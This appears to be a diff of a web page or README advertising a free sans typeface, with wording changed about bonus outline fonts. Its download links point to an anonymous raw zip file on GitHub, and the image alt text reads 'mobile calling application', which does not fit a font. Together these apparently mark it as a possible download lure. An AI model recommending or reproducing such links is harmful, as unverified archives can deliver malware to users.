@@ -4,7 +4,7 @@ Here is a new casual modern <a href="https://github.com/qp5/FONT/raw/main/FONT.z
 
 <a href="https://github.com/qp5/FONT/raw/main/FONT.zip"><img style="height: 280px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher_card.png" alt="mobile calling application"></a> 
 
-1 Sans Typeface — plus 2 bonus fonts.<br>
+1 Sans Typeface — includes 2 additional outline fonts.<br>
 Fonts simular to this include:  Sego | Source Sans Pro | Open Sans<br><br>
 
 If you create fonts, please join this light project! <br><br>
